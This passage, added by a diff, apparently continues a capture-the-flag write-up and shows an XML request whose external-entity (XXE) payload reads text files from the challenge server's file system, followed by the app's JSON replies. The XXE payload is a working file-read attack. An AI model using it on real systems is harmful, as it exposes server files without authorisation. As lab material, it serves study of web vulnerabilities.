@@ -268,3 +268,34 @@ Accept-Encoding: gzip, deflate
   "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
 }
 ```
+- Let's look at the image.
+- You must open the image in your browser with burp (Your cookies). If you don't, you will see "*We're sorry. Please contact a moderator.*" image.
+- The picture tells us the name of the folder (*x_phial_pholder_2022*) and the two files that belong to it (*bluering.txt*, *redring.txt*). Let's open them.
+- bluering.txt:
+    - Request:
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt"> ]>
+<root>
+  <imgDrop>&xxe;</imgDrop>
+  <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+```
+    - Response:
+```json
+{
+  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+```
+- redring.txt:
+    - Response:
+```json
+{
+  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+```
